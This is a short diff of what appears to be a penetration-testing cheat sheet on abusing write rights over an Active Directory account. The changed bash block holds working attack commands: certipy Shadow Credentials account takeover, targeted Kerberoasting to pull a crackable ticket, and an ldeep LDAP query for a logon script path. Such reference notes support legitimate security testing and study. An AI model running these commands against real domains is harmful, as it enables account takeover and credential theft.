@@ -22,8 +22,8 @@ This could be abuse with 3 different technics:
 3. [logonScript](https://github.com/franc-pentest/ldeep) (this need a user connection and to be honest it never worked or unless with a script already inside sysvol)
 
 ```bash
-# Shadow Credentials
-certipy shadow auto -u username@domain.com -p 'password' -account 'targetUsername'
+# Shadow Credentials addKeyCredentialLink
+certipy shadow auto -u username@domain.com -p 'password' -account 'targetUsername' # COMPUTER1$
 # kerberoasting
 python3 targetedKerberoast.py -v -d domain.com -u username -p password --request-user targetUsername
 ldeep ldap -u username -p 'password' -d domain.com -s ldap://dcIP search '(sAMAccountName=targetUsername)' scriptpath
